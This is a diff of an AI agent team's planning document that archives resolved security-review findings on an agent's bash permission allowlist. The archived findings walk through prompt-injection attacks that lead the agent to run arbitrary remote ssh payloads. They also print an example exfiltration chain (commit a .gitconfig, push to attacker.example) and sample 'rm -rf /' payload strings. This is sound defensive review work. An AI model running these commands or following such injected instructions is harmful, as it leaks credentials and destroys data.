@@ -132,12 +132,14 @@ the PM reads.*
       H-1 decision; final state `ef884e4` confirmed on the remote.
 - [x] After the user's H-1 decision (complete 2026-08-29): Robotnik ticked the Omega box
       (decision + verification in `## Security`'s H-1 resolution line), committed + pushed.
-- [ ] `Knuckles`: re-verify the DONE checklist against the resolved state, run `git ls-remote
-      origin main`, quote the line, update `## Release` (DONE = yes, with the H-1 resolution
-      referenced), commit + push, verify HEAD.
-- [ ] `Espio`: full pruning pass (task closed): round-1/2 findings are resolved and shipped,
-      compress with fixing shas; keep decisions, verified facts, and the H-1 escalation +
-      resolution record.
+- [x] `Knuckles` (complete 2026-08-29): DONE checklist re-verified against the resolved state —
+      `## Release` now reads DONE = yes (supersedes the pre-decision "no" record), live
+      `git ls-remote` line quoted, `ef884e4` ancestry PASS, shipped as `5cdde47`.
+- [x] `Espio` (pruning complete 2026-08-29): closure pass — 8 resolved finding blocks (Shadow
+      round-1 nit, round-2 nit; Omega H-2, H-3, four low findings) compressed to one-liners with
+      the fixing shas in `## Review`/`## Security`; full block text moved to `## Archive`
+      "Pruned 2026-08-29 (closure pass)"; H-1 finding + escalation + RESOLVED text untouched.
+- [ ] `Robotnik` ships the pruned doc (Espio has `bash: deny`).
 
 ---
 
@@ -287,13 +289,7 @@ No other file in `.opencode/agents/` was touched. `git status --short` before th
 
 **Verdict: no blockers, no should-fix. One nit.**
 
-### ls-remote output for the follow-up sha `ad9632c` is not recorded
-**Severity:** nit
-**Where:** `planning/docs/TASK-0014-vector-bash-permissions.md:169-170`
-**Problem:** `## Implementation` quotes the `git ls-remote origin main` output for `9e1f0c9` but states the `ad9632c` re-verification without quoting its output line, and that line is recoverable nowhere else (opencode.log records permission evaluations only, and no file under `~/.local/share/opencode/tool-output/` contains it, checked by grep).
-**Failure scenario:** an auditor checking the DoD box "local HEAD == remote HEAD (verified with `git ls-remote`)" from the doc alone has the command and the conclusion but not the output for the final sha, and must re-run `git ls-remote origin main` to close the loop.
-**Suggested direction:** quote a fresh `git ls-remote origin main` output in `## Release` when `Knuckles` re-verifies (that Next Actions item already says so), or append the line to `## Implementation`.
-**Resolution:** resolved 2026-08-29 by Shadow (round-2 re-review, per dispatch): fixed in `15f6c29` + `ef884e4`. `## Implementation` now quotes actual `git ls-remote origin main` output for `15f6c29` and `152a068`, and the terminal sha (`ef884e4`) output line is explicitly deferred to `## Release` (Knuckles), which is this finding's suggested direction. The original `ad9632c` line was not backfilled, but the chain is bracketed by quoted push output on both sides (`9e1f0c9..ad9632c` recorded PASS in round 1; `ad9632c..15f6c29` quoted in round 2), so an auditor can close the loop without re-running the command.
+- **nit (round 1)** — the `git ls-remote origin main` output line for follow-up sha `ad9632c` was not quoted in `## Implementation` — resolved, fixed in `15f6c29` + `ef884e4`.
 
 **Verification detail (all PASS)**
 
@@ -324,13 +320,7 @@ No other file in `.opencode/agents/` was touched. `git status --short` before th
 
 **Effect note (carried from round 1, still accurate):** the reworked rules take effect only on the next opencode restart. This session (run e25f36ec, started 2026-08-28T13:07:52Z) loaded the pre-task Vector file, so its in-memory Vector set is the original five rules; neither round's rules are active until the next start. Documented expectation (Status), no action.
 
-### The unamended Omega DoD box still names the removed `ssh howard@192.168.1.106*` pattern and "the five new patterns"
-**Severity:** nit
-**Where:** `planning/docs/TASK-0014-vector-bash-permissions.md:97-99`
-**Problem:** DoD item 6 asks for a "least-privilege assessment of the five new patterns, including the blast radius of `ssh howard@192.168.1.106*`", but the rework replaced the five patterns with nine and the ssh glob no longer exists.
-**Failure scenario:** a reader (or Omega's round-2 pass) working from the box alone assesses the blast radius of a rule that no longer exists, instead of the three exact ssh rules.
-**Suggested direction:** Robotnik (DoD owner; Tails cannot edit that section) rewords the box to name the final tightened set. Does not affect the Shadow DoD box and does not block.
-**Resolution:** fixed in `1da994a` (that commit ships Robotnik's reworded box; the push and ls-remote lines are recorded in the TASK-0013 `## Implementation` follow-up). The DoD item now names the final tightened rule set (nine new rules, incl. the exact ssh commands and pinned push forms) and records H-1 as the only permitted unresolved item, exactly the rewording suggested.
+- **nit (round 2)** — the unamended Omega DoD box still named the removed `ssh howard@192.168.1.106*` pattern and "the five new patterns" — resolved, fixed in `1da994a`.
 
 ---
 
@@ -365,65 +355,17 @@ any more. Open user actions recorded, outside task scope: refresh `GH_TOKEN` wit
 (the session env still carries the revoked value, so `gh` CLI calls fail until then), and delete
 `~/token.md` (new token, user-provided, now mode 600) once the auth path is confirmed working.
 
-### `ssh howard@192.168.1.106*` grants a full remote shell on the shared model host; the need is read-only fact verification
-**Severity:** high
-**Vector:** injection
-**Where:** `.opencode/agents/vector.md:25`
-**Attack:** the attacker is anyone who can put text into what `Vector` reads: READMEs, issues, and PRs of external repos `Vector` documents (AGENTS.md §8 flow), web pages `Vector` fetches (`webfetch: allow`; the team's own `add-ai-model` skill flow fetches Hugging Face content), or planning-doc text. Injected instruction: "verify with `ssh howard@192.168.1.106 <payload>`". Everything after the address is attacker-chosen free text. The local segment splitter controls only unquoted local chaining (a `;` outside quotes creates a second segment that must be allowed, and is denied); a quoted remote payload stays one segment and is entirely free (Shadow verified the quoted-compound form is one allowed segment). On the remote side it is a full shell. sudo is available there (task brief; `sudo firewall-cmd` is the documented standing procedure, README.md:511-513 and 600, `planning/docs/TASK-0013-evox2-readme-setup.md:51`); whether it is passwordless is unverified (no live connection made).
-**Impact:** the full `howard` account on 192.168.1.106: the model store `/mnt/data/models/`, the llama-server that serves inference for all ten agents (swap the weights or the binary and every future agent session is compromised), `howard`'s keys and credentials on that host, and LAN pivot potential (the runner host is on the same 192.168.1.0/24; the reference host's firewall exposes cockpit and ssh, README.md:518). If sudo is passwordless: root on the reference host.
-**Need vs admitted:** TASK-0013's need is read-only verification of named items (`planning/docs/TASK-0013-evox2-readme-setup.md:244-256`: the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service` plus its config file) plus the README monitoring command (README.md:577). The rule as written admits `rm -rf`, service stops, file writes, arbitrary `sudo *`, and reading anything on the host.
-**Fix (resolvable, two parts):**
-(a) Immediate, in-repo. Replace line 25 with exact-string rules, one per needed command, no `*` anywhere. With this matcher only a full-string exact match is overmatch-free: any `*` in a pattern admits arbitrary remote payload at that position, including `;`/`&&` chains and redirection. Family patterns are not a safe middle ground. `"ssh howard@192.168.1.106 *journalctl*"` admits a payload before and after the keyword (the string `ssh howard@192.168.1.106 'rm -rf /; journalctl -k'` matches it), and `"ssh howard@192.168.1.106 journalctl*"` admits trailing chains (`journalctl -k; rm -rf /` matches) while failing the documented quoted-compound form (the leading quote breaks the literal prefix). Starting set, the needed commands as full literal strings (Tails handles YAML quoting and escaping when writing them as keys):
-- `ssh howard@192.168.1.106 'cat ~/.config/systemd/user/llama-server-qwen3.8-27b-q4.service'`
-- `ssh howard@192.168.1.106 'sudo firewall-cmd --list-all'`
-- `ssh howard@192.168.1.106 'systemctl cat ryzenadj.service'`
-- `ssh howard@192.168.1.106 'journalctl -k --no-pager | grep -cE "device wedged"'`
-Each new verification command gets a new exact rule (config edit plus opencode restart). Fail-closed on quoting variation: a command the model phrases differently is denied, not loosened.
-(b) Durable, host-side. Restrict the remote identity on 192.168.1.106 (a dedicated read-only user, or a wrapper with a server-side exec allowlist) so the remote shell itself is bounded; then the pattern can relax without re-opening sudo or arbitrary execution. Out of repo scope, flagged for the user.
-Note: even (a) leaves the remote `cat`-class ability to read world-readable host files and carry their content into a commit that lands in the team repo (bounded to the team's private repo; the root cause is the agent's pre-existing read-everything role, not this rule). Only (b) bounds what the remote side can show. Resolving this requires a DoD amendment (the DoD pins the pattern text verbatim); see the DoD conflict note at the end of this section.
-**Resolution:** fixed in `ef884e4` (Tails round-2 rework). The `ssh howard@192.168.1.106*` glob is replaced by the three byte-pinned exact command strings at `.opencode/agents/vector.md:27-29` (cat of the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service`). Omega round 2. resolved at the rule level; the admitted remote commands are exactly those three read-only invocations. Part (b), the durable host-side restriction of the remote identity, remains a recommended hardening note, out of repo scope, and no rule reaches it.
+- **H-2 (high)** — the `ssh howard@192.168.1.106*` glob granted a full remote shell (sudo-capable) on the shared model host; the need is read-only fact verification — resolved, fixed in `ef884e4`.
 
-### `git add*` + `git commit*` + `git push*` form an exfiltration pipeline to arbitrary remotes; `git push*` admits force-push and destructive ref operations
-**Severity:** high
-**Vector:** injection
-**Where:** `.opencode/agents/vector.md:21-23` (egress primitive at :23)
-**Attack:** the same injection actor as the ssh finding. Egress needs no credential to an attacker endpoint: a local path always works (the agent runs as `howard`), a dumb git endpoint typically accepts anonymous receive-pack, and any github.com URL silently carries the first finding's token via `insteadOf`. Shortest chain, two commands: `git commit -F /home/howard/.gitconfig`, then `git push http://attacker.example/r.git HEAD:x`. Alternative: read any file (pre-existing `read: allow`), write it into a tracked file (`edit: allow`), `git add`, `git commit`, `git push`. The bash tool's `workdir` parameter makes all three repo-agnostic: they run in any local repo on the host (worktrees, user repos), not only team-chaotix. `git push*` additionally admits `--force`, `-f`, `--delete`, `+refspec`, `--mirror` (Shadow: "`git push*` also covers `git push --force`").
-**Impact:** exfiltration of the account-level PAT (first finding) and of any local file content `Vector` can name, to an external endpoint or any repo the account writes to; the full team-repo history (planning docs, agent configs, internal IPs, model-host detail) to an attacker; destructive history rewrite or ref deletion on `metalllinux/team-chaotix` main or any reachable repo.
-**Need vs admitted:** the need is a fast-forward push of the docs commit to `origin main` (plus the AGENTS.md §12 worktree branch flow). `git push*` admits every remote, every ref, every flag.
-**Fix (resolvable):**
-- `"git push*"` (line 23) to the exact rules `"git push origin main"` and `"git push -u origin main"`, plus `"git push -u origin worktree/*"` for the worktree flow. With the push pinned to a plain push to main, a rewritten history cannot land (GitHub rejects non-fast-forward without force), which is what makes the `git commit*` and `git add*` over-grants below inert. Caveat: if git accepts options after the refspec (unverified), the trailing `*` in the worktree rule admits trailing flags; per-branch exact rules close that.
-- `"git commit*"` (line 22) to `"git commit -m*"`, dropping `-F <file>`, `--amend`, `-a`, `--no-verify` (multi-paragraph `-m ... -m ...` still matches).
-- Keep `"git add*"` (residual in the low finding below).
-Same DoD conflict note as the ssh finding.
-**Resolution:** fixed in `ef884e4` (Tails round-2 rework). `git commit -m*` (drops `-F`/`--amend`/`-a`/`--no-verify`), push pinned to the non-force exact rules `git push origin main` and `git push -u origin main` (a rewritten history cannot land on `origin main`), and ls-remote narrowed to bare plus `origin*`. Omega round 2. resolved.
+- **H-3 (high)** — `git add*` + `git commit*` + `git push*` formed an exfiltration pipeline to arbitrary remotes and admitted `--force`/`--delete` — resolved, fixed in `ef884e4`.
 
-### `git add*` admits `--force` (staging gitignored files) and whole-tree sweeps
-**Severity:** low
-**Vector:** authz
-**Where:** `.opencode/agents/vector.md:21`
-**Attack:** `git add .` / `git add -A` sweeps untracked files (user WIP, untracked secrets in the repo dir); `git add --force` stages gitignored files, the standard hiding place for local secrets. Pre-push-fix this is the staging step of the pipeline above; post-push-fix the blast radius is the team repo (or a local-only disturbance in another repo via `workdir`). Recorded as residual; no independent fix required once the push rule is pinned.
-**Resolution:** recorded as residual R1 in Omega round 2 (rule unchanged at `.opencode/agents/vector.md:21`; `--force` and sweeps remain admitted). Once the push rule is pinned to non-force `origin main`, the blast radius is bounded to the team repo (or a local-only disturbance in another repo via `workdir`), which is exactly what the finding records. No independent fix required, per the finding.
+- **low (round 1)** — `git add*` admits `--force` (staging gitignored files) and whole-tree sweeps — resolved, no fix: accepted as residual R1 (bounded to the team repo once the push rule is pinned).
 
-### `git commit*` admits `--amend`, `-F <file>`, `-a`, `--no-verify`
-**Severity:** low
-**Vector:** authz
-**Where:** `.opencode/agents/vector.md:22`
-**Attack:** `-F <file>` embeds arbitrary file content in a commit message (the named pipeline step in the high finding); `--amend` rewrites the last commit. Post-push-fix, an amended or otherwise rewritten commit cannot land on main (the server rejects non-fast-forward), so the residual is local-only. Recorded as residual; resolved by the high finding's `"git commit -m*"` narrowing.
-**Resolution:** resolved by the `ef884e4` narrowing to `"git commit -m*"` (Tails round-2 rework), which drops `-F`, leading `--amend`, `-a`, and `--no-verify`. The trailing-flag surface (e.g. `--amend` after `-m` if git parses it, unverified) is recorded as residual R2 and is inert against `origin main` because the client refuses non-fast-forward.
+- **low (round 1)** — `git commit*` admits `--amend`, `-F <file>`, `-a`, `--no-verify` — resolved, fixed in `ef884e4` (narrowed to `git commit -m*`; trailing-flag surface recorded as residual R2, inert against `origin main`).
 
-### `git ls-remote*` admits an arbitrary URL
-**Severity:** low
-**Vector:** authz
-**Where:** `.opencode/agents/vector.md:24`
-**Attack:** `git ls-remote <url>` enumerates the refs of any repo the host's git credential can reach (the first finding's token is presented for github.com URLs via `insteadOf`). Refs only, no content; the exposure is branch names (project codenames, `worktree/<name>` branches). The need is `git ls-remote origin main` for remote-HEAD verification. Optional narrowing if the high finding's fix is applied: exact `"git ls-remote origin main"` plus `"git ls-remote origin worktree/*"`. Recorded as residual.
-**Resolution:** narrowed in `ef884e4` (Tails round-2 rework) to the bare `git ls-remote` rule (a no-op. git errors without a repository argument) plus `git ls-remote origin*`. An arbitrary URL is denied. `origin` is the sole remote in this repo (`.git/config`), so `origin*` cannot overmatch a different remote here. Ref enumeration of `origin` is recorded as residual R3.
+- **low (round 1)** — `git ls-remote*` admits an arbitrary URL — resolved, fixed in `ef884e4` (narrowed to bare `git ls-remote` plus `git ls-remote origin*`; ref enumeration of `origin` recorded as residual R3).
 
-### The ssh rule over-matches sibling addresses and ports; bare interactive ssh is admitted
-**Severity:** low
-**Vector:** authz
-**Where:** `.opencode/agents/vector.md:25`
-**Attack:** the glob is on the string, so `howard@192.168.1.1066` (a different LAN host) and `howard@192.168.1.106:2222` (a different port on the same host) both match. Auth to the siblings presumably fails (no authorized key), impact low; stated for completeness. Bare `ssh howard@192.168.1.106` (interactive) is admitted but gains nothing in a non-interactive bash tool (hangs to timeout). Closed by the high finding's exact-string fix, which pins the full string.
-**Resolution:** closed in `ef884e4` (Tails round-2 rework) by the byte-pinned exact ssh strings at `.opencode/agents/vector.md:27-29`. Sibling addresses, port suffixes, bare interactive ssh, and any other payload match no allow rule (Omega round 2, R4. closed by the exact strings, with the wildcard-free matcher probe).
+- **low (round 1)** — the ssh glob over-matches sibling addresses (`192.168.1.1066`) and ports (`:2222`) and admits bare interactive ssh — resolved, fixed in `ef884e4` (R4 closed by the byte-pinned exact strings).
 
 ### Least-privilege verdict per pattern
 
@@ -622,6 +564,7 @@ user said are never deleted.*
 |---|---|---|
 | 2026-08-29 | Minimal pass (task still Blocked on user H-1 decision): round-1 `Final permission.bash` block (10-rule state, superseded by the round-2 14-rule block) compressed to a pointer in `## Implementation`, full block moved here. No decisions or finding text touched | ~15 lines |
 | 2026-08-29 | Ship of this pass (same commit as the TASK-0013 pruning, prefix `TASK-0013:`) | shipped as `4610cdf` by Robotnik bookkeeping (Espio's loaded set is `bash: deny`, `.opencode/agents/espio.md:17`); local HEAD == remote HEAD verified | n/a |
+| 2026-08-29 | Closure pass (task closed, all DoD boxes ticked): 8 resolved finding blocks compressed to one line each in `## Review` (round-1 nit, round-2 nit) and `## Security` (H-2, H-3, four low findings); full block text moved to "Pruned 2026-08-29 (closure pass)" below. H-1 finding, its escalation, and the RESOLVED text untouched; verification detail, assessment tables, and round-2 re-verification records left in place | ~68 lines |
 
 ### Superseded round-1 `permission.bash` block (`.opencode/agents/vector.md:19-29`, read back after the round-1 edit, 2026-08-28)
 
@@ -643,3 +586,94 @@ Superseded by the round-2 tightened 14-rule set (full block in the round-2 secti
 `## Implementation`, shipped in `15f6c29`, final `ef884e4`). The five-glob ruleset is a
 rejected option; the rejection reasons live in `## Security` (Omega H-2: full remote shell;
 H-3: exfil pipeline plus force-push).
+
+### Pruned 2026-08-29 (closure pass)
+
+Resolved finding blocks compressed to one line in `## Review` and `## Security` (closure pass,
+task closed 2026-08-29, all DoD boxes ticked). Full block text below, verbatim except the
+header level (`###` demoted to `####` for nesting under this subsection). The H-1 finding,
+its escalation, and the RESOLVED text were not touched and are not archived here.
+
+#### `## Review`, round 1 — ls-remote output for the follow-up sha `ad9632c` is not recorded
+
+**Severity:** nit
+**Where:** `planning/docs/TASK-0014-vector-bash-permissions.md:169-170`
+**Problem:** `## Implementation` quotes the `git ls-remote origin main` output for `9e1f0c9` but states the `ad9632c` re-verification without quoting its output line, and that line is recoverable nowhere else (opencode.log records permission evaluations only, and no file under `~/.local/share/opencode/tool-output/` contains it, checked by grep).
+**Failure scenario:** an auditor checking the DoD box "local HEAD == remote HEAD (verified with `git ls-remote`)" from the doc alone has the command and the conclusion but not the output for the final sha, and must re-run `git ls-remote origin main` to close the loop.
+**Suggested direction:** quote a fresh `git ls-remote origin main` output in `## Release` when `Knuckles` re-verifies (that Next Actions item already says so), or append the line to `## Implementation`.
+**Resolution:** resolved 2026-08-29 by Shadow (round-2 re-review, per dispatch): fixed in `15f6c29` + `ef884e4`. `## Implementation` now quotes actual `git ls-remote origin main` output for `15f6c29` and `152a068`, and the terminal sha (`ef884e4`) output line is explicitly deferred to `## Release` (Knuckles), which is this finding's suggested direction. The original `ad9632c` line was not backfilled, but the chain is bracketed by quoted push output on both sides (`9e1f0c9..ad9632c` recorded PASS in round 1; `ad9632c..15f6c29` quoted in round 2), so an auditor can close the loop without re-running the command.
+
+#### `## Review`, round 2 — The unamended Omega DoD box still names the removed `ssh howard@192.168.1.106*` pattern and "the five new patterns"
+
+**Severity:** nit
+**Where:** `planning/docs/TASK-0014-vector-bash-permissions.md:97-99`
+**Problem:** DoD item 6 asks for a "least-privilege assessment of the five new patterns, including the blast radius of `ssh howard@192.168.1.106*`", but the rework replaced the five patterns with nine and the ssh glob no longer exists.
+**Failure scenario:** a reader (or Omega's round-2 pass) working from the box alone assesses the blast radius of a rule that no longer exists, instead of the three exact ssh rules.
+**Suggested direction:** Robotnik (DoD owner; Tails cannot edit that section) rewords the box to name the final tightened set. Does not affect the Shadow DoD box and does not block.
+**Resolution:** fixed in `1da994a` (that commit ships Robotnik's reworded box; the push and ls-remote lines are recorded in the TASK-0013 `## Implementation` follow-up). The DoD item now names the final tightened rule set (nine new rules, incl. the exact ssh commands and pinned push forms) and records H-1 as the only permitted unresolved item, exactly the rewording suggested.
+
+#### `## Security`, round 1 — `ssh howard@192.168.1.106*` grants a full remote shell on the shared model host; the need is read-only fact verification
+
+**Severity:** high
+**Vector:** injection
+**Where:** `.opencode/agents/vector.md:25`
+**Attack:** the attacker is anyone who can put text into what `Vector` reads: READMEs, issues, and PRs of external repos `Vector` documents (AGENTS.md §8 flow), web pages `Vector` fetches (`webfetch: allow`; the team's own `add-ai-model` skill flow fetches Hugging Face content), or planning-doc text. Injected instruction: "verify with `ssh howard@192.168.1.106 <payload>`". Everything after the address is attacker-chosen free text. The local segment splitter controls only unquoted local chaining (a `;` outside quotes creates a second segment that must be allowed, and is denied); a quoted remote payload stays one segment and is entirely free (Shadow verified the quoted-compound form is one allowed segment). On the remote side it is a full shell. sudo is available there (task brief; `sudo firewall-cmd` is the documented standing procedure, README.md:511-513 and 600, `planning/docs/TASK-0013-evox2-readme-setup.md:51`); whether it is passwordless is unverified (no live connection made).
+**Impact:** the full `howard` account on 192.168.1.106: the model store `/mnt/data/models/`, the llama-server that serves inference for all ten agents (swap the weights or the binary and every future agent session is compromised), `howard`'s keys and credentials on that host, and LAN pivot potential (the runner host is on the same 192.168.1.0/24; the reference host's firewall exposes cockpit and ssh, README.md:518). If sudo is passwordless: root on the reference host.
+**Need vs admitted:** TASK-0013's need is read-only verification of named items (`planning/docs/TASK-0013-evox2-readme-setup.md:244-256`: the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service` plus its config file) plus the README monitoring command (README.md:577). The rule as written admits `rm -rf`, service stops, file writes, arbitrary `sudo *`, and reading anything on the host.
+**Fix (resolvable, two parts):**
+(a) Immediate, in-repo. Replace line 25 with exact-string rules, one per needed command, no `*` anywhere. With this matcher only a full-string exact match is overmatch-free: any `*` in a pattern admits arbitrary remote payload at that position, including `;`/`&&` chains and redirection. Family patterns are not a safe middle ground. `"ssh howard@192.168.1.106 *journalctl*"` admits a payload before and after the keyword (the string `ssh howard@192.168.1.106 'rm -rf /; journalctl -k'` matches it), and `"ssh howard@192.168.1.106 journalctl*"` admits trailing chains (`journalctl -k; rm -rf /` matches) while failing the documented quoted-compound form (the leading quote breaks the literal prefix). Starting set, the needed commands as full literal strings (Tails handles YAML quoting and escaping when writing them as keys):
+- `ssh howard@192.168.1.106 'cat ~/.config/systemd/user/llama-server-qwen3.8-27b-q4.service'`
+- `ssh howard@192.168.1.106 'sudo firewall-cmd --list-all'`
+- `ssh howard@192.168.1.106 'systemctl cat ryzenadj.service'`
+- `ssh howard@192.168.1.106 'journalctl -k --no-pager | grep -cE "device wedged"'`
+Each new verification command gets a new exact rule (config edit plus opencode restart). Fail-closed on quoting variation: a command the model phrases differently is denied, not loosened.
+(b) Durable, host-side. Restrict the remote identity on 192.168.1.106 (a dedicated read-only user, or a wrapper with a server-side exec allowlist) so the remote shell itself is bounded; then the pattern can relax without re-opening sudo or arbitrary execution. Out of repo scope, flagged for the user.
+Note: even (a) leaves the remote `cat`-class ability to read world-readable host files and carry their content into a commit that lands in the team repo (bounded to the team's private repo; the root cause is the agent's pre-existing read-everything role, not this rule). Only (b) bounds what the remote side can show. Resolving this requires a DoD amendment (the DoD pins the pattern text verbatim); see the DoD conflict note at the end of this section.
+**Resolution:** fixed in `ef884e4` (Tails round-2 rework). The `ssh howard@192.168.1.106*` glob is replaced by the three byte-pinned exact command strings at `.opencode/agents/vector.md:27-29` (cat of the user unit file, `sudo firewall-cmd --list-all`, `systemctl cat ryzenadj.service`). Omega round 2. resolved at the rule level; the admitted remote commands are exactly those three read-only invocations. Part (b), the durable host-side restriction of the remote identity, remains a recommended hardening note, out of repo scope, and no rule reaches it.
+
+#### `## Security`, round 1 — `git add*` + `git commit*` + `git push*` form an exfiltration pipeline to arbitrary remotes; `git push*` admits force-push and destructive ref operations
+
+**Severity:** high
+**Vector:** injection
+**Where:** `.opencode/agents/vector.md:21-23` (egress primitive at :23)
+**Attack:** the same injection actor as the ssh finding. Egress needs no credential to an attacker endpoint: a local path always works (the agent runs as `howard`), a dumb git endpoint typically accepts anonymous receive-pack, and any github.com URL silently carries the first finding's token via `insteadOf`. Shortest chain, two commands: `git commit -F /home/howard/.gitconfig`, then `git push http://attacker.example/r.git HEAD:x`. Alternative: read any file (pre-existing `read: allow`), write it into a tracked file (`edit: allow`), `git add`, `git commit`, `git push`. The bash tool's `workdir` parameter makes all three repo-agnostic: they run in any local repo on the host (worktrees, user repos), not only team-chaotix. `git push*` additionally admits `--force`, `-f`, `--delete`, `+refspec`, `--mirror` (Shadow: "`git push*` also covers `git push --force`").
+**Impact:** exfiltration of the account-level PAT (first finding) and of any local file content `Vector` can name, to an external endpoint or any repo the account writes to; the full team-repo history (planning docs, agent configs, internal IPs, model-host detail) to an attacker; destructive history rewrite or ref deletion on `metalllinux/team-chaotix` main or any reachable repo.
+**Need vs admitted:** the need is a fast-forward push of the docs commit to `origin main` (plus the AGENTS.md §12 worktree branch flow). `git push*` admits every remote, every ref, every flag.
+**Fix (resolvable):**
+- `"git push*"` (line 23) to the exact rules `"git push origin main"` and `"git push -u origin main"`, plus `"git push -u origin worktree/*"` for the worktree flow. With the push pinned to a plain push to main, a rewritten history cannot land (GitHub rejects non-fast-forward without force), which is what makes the `git commit*` and `git add*` over-grants below inert. Caveat: if git accepts options after the refspec (unverified), the trailing `*` in the worktree rule admits trailing flags; per-branch exact rules close that.
+- `"git commit*"` (line 22) to `"git commit -m*"`, dropping `-F <file>`, `--amend`, `-a`, `--no-verify` (multi-paragraph `-m ... -m ...` still matches).
+- Keep `"git add*"` (residual in the low finding below).
+Same DoD conflict note as the ssh finding.
+**Resolution:** fixed in `ef884e4` (Tails round-2 rework). `git commit -m*` (drops `-F`/`--amend`/`-a`/`--no-verify`), push pinned to the non-force exact rules `git push origin main` and `git push -u origin main` (a rewritten history cannot land on `origin main`), and ls-remote narrowed to bare plus `origin*`. Omega round 2. resolved.
+
+#### `## Security`, round 1 — `git add*` admits `--force` (staging gitignored files) and whole-tree sweeps
+
+**Severity:** low
+**Vector:** authz
+**Where:** `.opencode/agents/vector.md:21`
+**Attack:** `git add .` / `git add -A` sweeps untracked files (user WIP, untracked secrets in the repo dir); `git add --force` stages gitignored files, the standard hiding place for local secrets. Pre-push-fix this is the staging step of the pipeline above; post-push-fix the blast radius is the team repo (or a local-only disturbance in another repo via `workdir`). Recorded as residual; no independent fix required once the push rule is pinned.
+**Resolution:** recorded as residual R1 in Omega round 2 (rule unchanged at `.opencode/agents/vector.md:21`; `--force` and sweeps remain admitted). Once the push rule is pinned to non-force `origin main`, the blast radius is bounded to the team repo (or a local-only disturbance in another repo via `workdir`), which is exactly what the finding records. No independent fix required, per the finding.
+
+#### `## Security`, round 1 — `git commit*` admits `--amend`, `-F <file>`, `-a`, `--no-verify`
+
+**Severity:** low
+**Vector:** authz
+**Where:** `.opencode/agents/vector.md:22`
+**Attack:** `-F <file>` embeds arbitrary file content in a commit message (the named pipeline step in the high finding); `--amend` rewrites the last commit. Post-push-fix, an amended or otherwise rewritten commit cannot land on main (the server rejects non-fast-forward), so the residual is local-only. Recorded as residual; resolved by the high finding's `"git commit -m*"` narrowing.
+**Resolution:** resolved by the `ef884e4` narrowing to `"git commit -m*"` (Tails round-2 rework), which drops `-F`, leading `--amend`, `-a`, and `--no-verify`. The trailing-flag surface (e.g. `--amend` after `-m` if git parses it, unverified) is recorded as residual R2 and is inert against `origin main` because the client refuses non-fast-forward.
+
+#### `## Security`, round 1 — `git ls-remote*` admits an arbitrary URL
+
+**Severity:** low
+**Vector:** authz
+**Where:** `.opencode/agents/vector.md:24`
+**Attack:** `git ls-remote <url>` enumerates the refs of any repo the host's git credential can reach (the first finding's token is presented for github.com URLs via `insteadOf`). Refs only, no content; the exposure is branch names (project codenames, `worktree/<name>` branches). The need is `git ls-remote origin main` for remote-HEAD verification. Optional narrowing if the high finding's fix is applied: exact `"git ls-remote origin main"` plus `"git ls-remote origin worktree/*"`. Recorded as residual.
+**Resolution:** narrowed in `ef884e4` (Tails round-2 rework) to the bare `git ls-remote` rule (a no-op. git errors without a repository argument) plus `git ls-remote origin*`. An arbitrary URL is denied. `origin` is the sole remote in this repo (`.git/config`), so `origin*` cannot overmatch a different remote here. Ref enumeration of `origin` is recorded as residual R3.
+
+#### `## Security`, round 1 — The ssh rule over-matches sibling addresses and ports; bare interactive ssh is admitted
+
+**Severity:** low
+**Vector:** authz
+**Where:** `.opencode/agents/vector.md:25`
+**Attack:** the glob is on the string, so `howard@192.168.1.1066` (a different LAN host) and `howard@192.168.1.106:2222` (a different port on the same host) both match. Auth to the siblings presumably fails (no authorized key), impact low; stated for completeness. Bare `ssh howard@192.168.1.106` (interactive) is admitted but gains nothing in a non-interactive bash tool (hangs to timeout). Closed by the high finding's exact-string fix, which pins the full string.
+**Resolution:** closed in `ef884e4` (Tails round-2 rework) by the byte-pinned exact ssh strings at `.opencode/agents/vector.md:27-29`. Sibling addresses, port suffixes, bare interactive ssh, and any other payload match no allow rule (Omega round 2, R4. closed by the exact strings, with the wildcard-free matcher probe).
